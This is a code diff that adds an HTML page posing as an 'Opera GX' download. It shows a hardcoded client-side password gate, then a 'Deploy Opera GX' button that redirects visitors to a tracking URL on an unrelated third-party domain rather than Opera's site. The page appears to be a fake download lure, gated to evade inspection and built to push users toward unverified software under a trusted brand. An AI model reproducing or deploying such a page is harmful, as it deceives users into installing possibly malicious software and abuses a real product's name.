@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Download Opera GX</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0a0f2c, #360018);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background-color: rgba(10, 15, 44, 0.85);
+      border: 2px solid #8b0000;
+      border-radius: 12px;
+      padding: 40px;
+      box-shadow: 0 0 25px #8b0000;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    input[type="password"] {
+      padding: 10px;
+      width: 100%;
+      margin-top: 20px;
+      border-radius: 6px;
+      border: none;
+      background: #1e1e2f;
+      color: white;
+      font-size: 16px;
+    }
+
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background-color: #8b0000;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #b22222;
+    }
+
+    .error {
+      margin-top: 15px;
+      color: #ff4d4d;
+    }
+
+    .confirm-container {
+      margin-top: 20px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Download Opera GX</h2>
+    <input type="password" id="password" placeholder="Password" />
+    <button onclick="checkPassword()">Login</button>
+    <div class="error" id="errorMsg"></div>
+
+    <div class="confirm-container" id="confirmSection">
+      <p>Are you sure you want to install?</p>
+      <button onclick="proceed()">Deploy Opera GX</button>
+    </div>
+  </div>
+
+  <script>
+    const correctPassword = "5084820933";
+
+    function checkPassword() {
+      const input = document.getElementById("password").value;
+      const errorMsg = document.getElementById("errorMsg");
+      const confirmSection = document.getElementById("confirmSection");
+
+      if (input === correctPassword) {
+        errorMsg.textContent = "";
+        confirmSection.style.display = "block";
+      } else {
+        errorMsg.textContent = "Incorrect password. Try again.";
+        confirmSection.style.display = "none";
+      }
+    }
+
+    function proceed() {
+      window.location.href = "https://d1bm3eohubcc73dn3sn0.vetraxluna.co.in/01/?cid=6b52e4d774edddafcd9b&list=7&extclickid=5373345771a0aec47805f3b94b6618d7&t1=25543386&t2=3406441&tsid=197&clickid=d1bm3eohubcc73dn3sn0&cost=1.260000&domain=depth-discovery.com&lp_key=17505282b872aaa643b74c4feeb9c67b65ddf57415&scenario=2&img=1#";
+    }
+  </script>
+</body>
+</html>
